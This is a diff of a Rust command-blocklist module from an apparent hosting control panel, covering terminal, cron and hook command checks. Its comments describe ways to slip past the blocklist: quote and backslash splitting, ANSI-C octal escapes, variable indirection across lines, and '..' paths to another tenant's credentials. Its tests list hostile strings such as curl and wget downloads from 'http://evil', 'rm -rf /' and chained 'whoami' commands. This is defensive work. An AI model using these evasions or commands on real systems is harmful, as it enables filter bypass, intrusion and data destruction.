@@ -67,15 +67,15 @@ const TERMINAL_BLOCKED_PATTERNS: &[&str] = &[
     //
     // `/var/www/` alone matched only the ABSOLUTE spelling, and the site shell's
     // own working directory is INSIDE `/var/www`, so the relative form walked
-    // straight past it: `cat ../other-site.com/wp-config.php` — another tenant's
-    // database credentials — was never examined by this list. `..` closes that
+    // straight past it: `cat ../other-site.com/wp-config.php` - another tenant's
+    // database credentials - was never examined by this list. `..` closes that
     // spelling. It is not legitimate input from a shell whose entire purpose is a
     // session inside one site's directory: every path a caller needs is at or
     // below the cwd.
     //
     // Blunt on purpose, and the cost is worth naming rather than hiding: this is a
     // SUBSTRING match, so `echo "done..."` is refused too. The narrower `"../"` was
-    // considered and rejected — it still admits a bare `cd ..`, after which every
+    // considered and rejected - it still admits a bare `cd ..`, after which every
     // subsequent path is an ordinary relative name and the guard has nothing left
     // to match. A pattern that one command steps around is worse than a blunt one,
     // because it reads as protection.
@@ -92,37 +92,37 @@ const TERMINAL_BLOCKED_PATTERNS: &[&str] = &[
 /// **This blocklist is a speed bump, not a tenant boundary, and it cannot be made
 /// into one.** There is no filesystem confinement behind it: the site-shell spawn
 /// in `routes/terminal.rs` performs `setgid`/`setuid`/`umask`/`chdir` and starts
-/// `bash --restricted` — no `chroot`, no mount namespace, no bind mount. Every
+/// `bash --restricted` - no `chroot`, no mount namespace, no bind mount. Every
 /// site's PHP-FPM pool and every site tree resolve to the SAME `www-data` uid, so
 /// two tenants are one principal to the kernel and mode bits cannot separate them.
 /// `bash --restricted` does not help either: rbash forbids slashes in COMMAND
 /// NAMES, not in arguments.
 ///
 /// So this list closes the two spellings a person actually types. A caller who
-/// wants the file can still reach it — through a symlink, through an editor's
+/// wants the file can still reach it - through a symlink, through an editor's
 /// open dialog, through any interpreter, or by any spelling nobody has enumerated.
 /// A real boundary is a per-site uid or a namespace at spawn time, and it is a
 /// different change from this one.
 ///
 /// **The same honest bound applies to every KEYWORD in `BLOCKED_PATTERNS`/
-/// `TERMINAL_BLOCKED_PATTERNS`, not just the two path spellings above — and
+/// `TERMINAL_BLOCKED_PATTERNS`, not just the two path spellings above - and
 /// it goes deeper than the quote/backslash evasion `normalize_for_blocklist`
 /// closes.** `routes/terminal.rs` filters one COMPLETED LINE at a time
 /// against a REAL, PERSISTENT `bash --restricted` process, so bash's own
 /// state (variables, functions) survives across lines even though this
 /// blocklist has no memory of them. A blocked keyword can be assembled from
-/// pieces with no adjacent literal substring on any single line — verified
+/// pieces with no adjacent literal substring on any single line - verified
 /// live, s445:
 ///
 ///     X=$'\143url'          (ANSI-C octal escape: bash decodes \143 → 'c';
 ///                             normalize_for_blocklist only strips quotes/
 ///                             backslashes, it does not decode escapes)
-///     $X --version           (no "curl" substring on THIS line either — X
+///     $X --version           (no "curl" substring on THIS line either - X
 ///                             was set on the line before, which this
 ///                             function never sees)
 ///
 /// Both lines pass `is_safe_terminal_command` individually. No per-line
-/// substring check — however the substring is normalized — can see this,
+/// substring check - however the substring is normalized - can see this,
 /// because the danger is in the RELATIONSHIP between two lines, not in
 /// either line's text. This is not a hypothetical: `X=curl; $X --version`
 /// (unobfuscated) already runs in `bash --restricted --norc --noprofile`
@@ -133,7 +133,7 @@ const TERMINAL_BLOCKED_PATTERNS: &[&str] = &[
 /// (`FOO=bar wp cache flush` is a legitimate one-liner) for a mitigation
 /// that still doesn't touch aliases/functions/`source`/`read`, so this is
 /// the same class of "different change" the paragraph above already
-/// concedes for filesystem confinement — egress control scoped to the
+/// concedes for filesystem confinement - egress control scoped to the
 /// terminal's own process tree, or dropping outbound network tools from the
 /// site-terminal's reachable PATH, is the shape of a real fix.
 const _SITE_SHELL_IS_NOT_A_SANDBOX: () = ();
@@ -143,19 +143,19 @@ const _SITE_SHELL_IS_NOT_A_SANDBOX: () = ();
 ///
 /// `cu''rl -o /tmp/p http://evil` and `w\get -qO- http://evil` contain no
 /// `curl`/`wget` SUBSTRING, so every check below that does a plain
-/// `lower.contains("curl")` waved them through — but `bash --restricted
+/// `lower.contains("curl")` waved them through - but `bash --restricted
 /// --norc --noprofile` (the exact invocation `routes/terminal.rs` spawns)
 /// removes the quotes/backslash before exec, and runs the real binary.
 /// `dockpanel-fanout` s445 reproduced this live against that exact
 /// invocation, and independently against `is_safe_cron_command`'s target
 /// (`bash -c`).
 ///
-/// This is deliberately NOT a shell parser — it only deletes quote/backslash
+/// This is deliberately NOT a shell parser - it only deletes quote/backslash
 /// characters, so it can only make MORE things match a keyword, never fewer.
 /// It does not close every evasion of a keyword blocklist against a real,
 /// persistent, Turing-complete shell: ANSI-C escapes (`$'\143url'`),
 /// arithmetic/parameter expansion, and command-name indirection via a shell
-/// variable set on a PRIOR line (`X=cu''rl` then `$X --version` — state a
+/// variable set on a PRIOR line (`X=cu''rl` then `$X --version` - state a
 /// per-line check cannot see) all still construct `curl` without ever
 /// spelling it as an adjacent literal substring. See
 /// `_SITE_SHELL_IS_NOT_A_SANDBOX` below and
@@ -173,7 +173,7 @@ fn normalize_for_blocklist(cmd: &str) -> String {
                 if let Some(next) = chars.next() {
                     out.push(next);
                 }
-                // A trailing lone backslash has nothing to escape — drop it.
+                // A trailing lone backslash has nothing to escape - drop it.
             }
             _ => out.push(c),
         }
@@ -191,9 +191,9 @@ pub fn is_safe_cron_command(cmd: &str) -> bool {
     // Reject shell metacharacters that enable chaining/substitution. A bare
     // `;` always chains regardless of exit status and was never the
     // legitimate case this function exists to allow (only `&&`/`||` are,
-    // per the BLOCKED_PATTERNS comment below) — reject it outright, same as
+    // per the BLOCKED_PATTERNS comment below) - reject it outright, same as
     // backtick/`$(`. The OLD "| "/"|/" substring checks required a trailing
-    // space or slash and passed straight through on "id|whoami" (no space) —
+    // space or slash and passed straight through on "id|whoami" (no space) -
     // a bare (unpaired) `|` chains just as effectively as `;`; only a PAIRED
     // `||` is the legitimate operator, so scan runs of `|` and reject any
     // run whose length isn't exactly 2.
@@ -220,12 +220,12 @@ pub fn is_safe_cron_command(cmd: &str) -> bool {
         }
     }
     // A bare `&` backgrounds a command and, mid-string, acts as a chain
-    // separator exactly like `;`/`|` — `id&whoami` runs both. Only a PAIRED
+    // separator exactly like `;`/`|` - `id&whoami` runs both. Only a PAIRED
     // `&&` is the legitimate operator; the same run-length scan used for `|`
     // above applies here, and for the identical reason it was needed there:
     // this codebase had no check on `&` at all until this fix.
     // A bare `&` backgrounds a command and, mid-string, acts as a chain
-    // separator exactly like `;`/`|` — `id&whoami` runs both. Only a PAIRED
+    // separator exactly like `;`/`|` - `id&whoami` runs both. Only a PAIRED
     // `&&` is the legitimate operator; the same run-length scan used for `|`
     // above applies here, and for the identical reason it was needed there:
     // this codebase had no check on `&` at all until this fix.
@@ -309,7 +309,7 @@ pub fn is_safe_hook_command(command: &str) -> bool {
         }
     }
     // Reject known dangerous patterns. Routed through `normalize_for_blocklist`
-    // like every sibling in this file — otherwise `r'm' -rf /` contains no
+    // like every sibling in this file - otherwise `r'm' -rf /` contains no
     // "rm -rf /" substring and passes this scan, then `sh -c` (the real
     // shell `git_build.rs::run_hook` execs it through) strips the quotes and
     // runs exactly that.
@@ -409,9 +409,9 @@ mod tests {
 
     /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
     /// "bash" suffix) passed straight through the old space/verb-anchored
-    /// checks — `is_safe_cron_command("id;whoami")` returned `true`, and the
+    /// checks - `is_safe_cron_command("id;whoami")` returned `true`, and the
     /// command reaches `crontab -u root -` and `bash -c` on the host as root.
-    /// `&&`/`||` must keep working — that's the whole reason this function
+    /// `&&`/`||` must keep working - that's the whole reason this function
     /// doesn't just ban every shell metacharacter outright.
     #[test]
     fn test_cron_bare_chain_operators_rejected_paired_operators_kept() {
@@ -431,7 +431,7 @@ mod tests {
     #[test]
     fn test_cron_bare_ampersand_rejected_paired_kept() {
         // The completeness-critic's executed PoC strings: `;` and `|` were fixed,
-        // `&` was not — a bare `&` chains just as effectively (background + continue).
+        // `&` was not - a bare `&` chains just as effectively (background + continue).
         assert!(!is_safe_cron_command("id&whoami"));
         assert!(!is_safe_cron_command("id & whoami"));
         assert!(!is_safe_cron_command("echo hi & whoami > /tmp/pwned"));
@@ -456,7 +456,7 @@ mod tests {
         // The unobfuscated forms must still be rejected too (no regression).
         assert!(!is_safe_terminal_command("curl -o /tmp/p http://evil"));
         assert!(!is_safe_terminal_command("wget -qO- http://evil"));
-        // Ordinary quoting for a LEGITIMATE argument must keep working —
+        // Ordinary quoting for a LEGITIMATE argument must keep working -
         // this is a substring check either way, so quoting an allowed word
         // was never what made it allowed.
         assert!(is_safe_terminal_command("echo 'hello world'"));
